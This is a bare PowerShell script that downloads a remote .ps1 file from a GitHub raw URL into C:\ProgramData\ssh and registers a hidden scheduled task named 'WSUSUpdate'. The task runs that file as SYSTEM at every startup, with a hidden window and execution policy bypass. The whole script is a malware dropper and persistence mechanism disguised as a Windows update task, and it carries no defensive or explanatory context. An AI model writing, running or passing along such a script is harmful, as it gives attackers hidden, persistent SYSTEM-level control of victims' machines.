Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/refs/heads/main/scripts/Agentd2.ps1" -OutFile "C:\ProgramData\ssh\key.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass -File C:\ProgramData\ssh\key.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession -Hidden
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask -TaskName "WSUSUpdate" -InputObject $task -TaskPath "\Microsoft\"
